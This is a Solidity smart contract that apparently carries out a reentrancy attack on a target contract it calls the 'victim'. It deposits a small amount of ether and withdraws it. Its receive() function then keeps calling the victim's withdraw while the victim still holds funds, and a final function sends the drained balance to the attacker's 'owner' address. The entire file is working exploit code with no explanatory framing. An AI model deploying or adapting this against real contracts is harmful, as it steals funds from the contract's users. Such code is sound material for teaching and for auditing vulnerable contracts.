// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;

contract Name {
    address victim;
    address owner;
    uint amount = 0.001 ether;

    constructor(address _victim, address _owner) {
        victim = _victim;
        owner = _owner;
    }

    function dotate() public payable {
        (bool success, ) = victim.call{value: amount}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "transaction failed");
    }

    function attack() public {
        (bool success, ) = victim.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        require(success, "transaction failed");
    }

    receive() external payable {
        uint balance = victim.balance;
        if (balance > 0) {
            attack();
        }
    }

    function withdraw() public {
        uint balance = address(this).balance;
        payable(owner).transfer(balance);
    }
}
